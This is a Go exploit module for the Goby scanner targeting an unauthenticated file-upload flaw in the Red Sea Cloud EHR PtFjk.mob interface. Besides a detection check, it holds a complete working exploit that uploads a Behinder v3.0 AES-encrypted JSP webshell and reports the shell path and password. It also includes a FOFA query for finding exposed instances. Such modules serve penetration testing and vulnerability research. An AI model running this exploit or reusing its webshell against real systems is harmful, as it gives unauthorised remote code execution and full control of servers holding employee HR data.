package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Description": "<p>The EHR system is a tool for digital management of human resources for enterprises. As the leading generation of digital human resource management systems in China, Honghai Cloud is committed to providing a comprehensive comprehensive solution for large and medium -sized enterprises.</p><p>The EHR system has an unauthorized upload interface, which can upload Webshell to order execution to obtain server permissions.</p><p><a href=\"https://fanyi.baidu.com/?aldtype=85###\"></a><a></a></p>",
    "Product": "Red Sea Cloud EHR",
    "Homepage": "https://www.hr-soft.cn/",
    "DisclosureDate": "2022-07-19",
    "Author": "PYkiller_removed_20221115",
    "FofaQuery": "body=\"/RedseaPlatform/skins/\"",
    "GobyQuery": "body=\"/RedseaPlatform/skins/\"",
    "Level": "3",
    "Impact": "<p>The EHR system has an unauthorized upload interface, which can be uploaded by Webshell to order execution</p>",
    "Recommendation": "<p>Official disposal suggestion: contact the manufacturer and upgrade to the highest version <a href=\"https://www.hr-soft.cn/\">https://www.hr-soft.cn/</a></p><p>Temporary disposal suggestion: The usage rate of this route is low. Temporary fixes can be made by restricting access to the route through the web.xml configuration of nginx or tomcat. If there is a front-end gateway device or flow control device, related access restriction functions can be configured.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "AttackSurfaces": {
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Translation": {
        "CN": {
            "Name": "红海云EHR PtFjk.mob接口任意文件上传漏洞",
            "Product": "红海云EHR",
            "Description": "<p>红海云eHR系统是企业用来进行人力资源数字化管理的工具。红海云作为国内领先一代的数字化人力资源管理系统，致力为大中型企业提供人力资源管理一体化综合解决方案。</p><p>红海云EHR系统存在未授权上传接口，可上传webshell来命令执行，获取服务器权限。</p>",
            "Recommendation": "<p>官方处置建议：联系厂商，升级到最高版本<a href=\"https://www.hr-soft.cn/\">https://www.hr-soft.cn/</a>临时处置建议：该路由使用率较低，临时修复可通过nginx或tomcat的<span style=\"color: rgb(77, 77, 77); font-size: 16px;\">web.</span>xml配置限制访问路由，若有前置网关设备或流控设备，可配置相关访问限制功能。</span></p>",
            "Impact": "<p>红海云EHR系统存在未授权上传接口，可上传webshell来命令执行。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "EHR PTFJK.MOB Interface Any File Upload Vulnerability",
            "Product": "Red Sea Cloud EHR",
            "Description": "<p>The EHR system is a tool for digital management of human resources for enterprises. As the leading generation of digital human resource management systems in China, Honghai Cloud is committed to providing a comprehensive comprehensive solution for large and medium -sized enterprises.</p><p>The EHR system has an unauthorized upload interface, which can upload Webshell to order execution to obtain server permissions.</p><p><a href=\"https://fanyi.baidu.com/?aldtype=85###\"></a><a></a></p>",
            "Recommendation": "<p>Official disposal suggestion: contact the manufacturer and upgrade to the highest version <a href=\"https://www.hr-soft.cn/\">https://www.hr-soft.cn/</a></p><p>Temporary disposal suggestion: The usage rate of this route is low. Temporary fixes can be made by restricting access to the route through the web.xml configuration of nginx or tomcat. If there is a front-end gateway device or flow control device, related access restriction functions can be configured.</p>",
            "Impact": "<p>The EHR system has an unauthorized upload interface, which can be uploaded by Webshell to order execution</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "Name": "EHR PTFJK.MOB Interface Any File Upload Vulnerability",
    "PocId": "10755"
}`

	getOAFilePath98234u293 := func(host *httpclient.FixUrl) string {
		requestConfig := httpclient.NewPostRequestConfig("/RedseaPlatform/PtFjk.mob?method=upload")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryt7WbDl1tXogoZys4")
		requestConfig.Data = "------WebKitFormBoundaryt7WbDl1tXogoZys4\r\nContent-Disposition: form-data; name=\"fj_file\"; filename=\"test123.jsp\"\r\nContent-Type:image/jpeg\r\n\r\n<%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\"ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundaryt7WbDl1tXogoZys4--\r\n"

		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "fileName") {
				if path := regexp.MustCompile(`/uploadfile.(.*?).jsp`).FindStringSubmatch(resp.RawBody); len(path) > 1 {

					return path[1]
				} else if path := regexp.MustCompile(`(.*?)htoadata/appdata/.*?\.dat`).FindStringSubmatch(resp.RawBody); len(path) > 1 {
					return path[1]
				}
			}
		}

		return ""
	}

	checkUploadedFile2398764278 := func(path string, host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewGetRequestConfig(path)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false

		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "e165421110ba03099a1c0393373c5b43")
		}

		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			path := "/uploadfile" + getOAFilePath98234u293(u) + ".jsp"

			return checkUploadedFile2398764278(path, u)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			uri := "/RedseaPlatform/PtFjk.mob?method=upload"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false

			cfg.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryt7WbDl1tXogoZys4")
			cfg.Data = "\n\n\n------WebKitFormBoundaryt7WbDl1tXogoZys4\nContent-Disposition: form-data; name=\"fj_file\"; filename=\"11.jsp\"\r\nContent-Type:image/jpeg\r\n\r\n<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\r\n------WebKitFormBoundaryt7WbDl1tXogoZys4--\n"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "fileName") {
					path := regexp.MustCompile(`/uploadfile.(.*?).jsp`).FindStringSubmatch(resp.RawBody)
					expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + "/uploadfile" + path[1] + ".jsp" + "\n"
					expResult.Output += "Password：rebeyond\n"
					expResult.Output += "Webshell tool: Behinder v3.0"
					expResult.Success = true
				}
			}

			return expResult
		},
	))
}
